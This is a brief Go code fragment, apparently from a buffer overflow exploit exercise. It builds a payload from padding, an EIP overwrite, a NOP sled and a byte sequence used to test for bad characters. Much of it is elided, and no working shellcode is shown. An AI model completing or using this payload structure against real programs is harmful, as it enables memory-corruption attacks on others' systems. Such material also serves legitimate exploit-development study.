...
func main() {
  ...
  //only null byte has been remved below, remove further as needed ...
	shell := "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" +
	...
	payload := as + eip + nop + shell + "\x00" //temove nullbyte if not needed
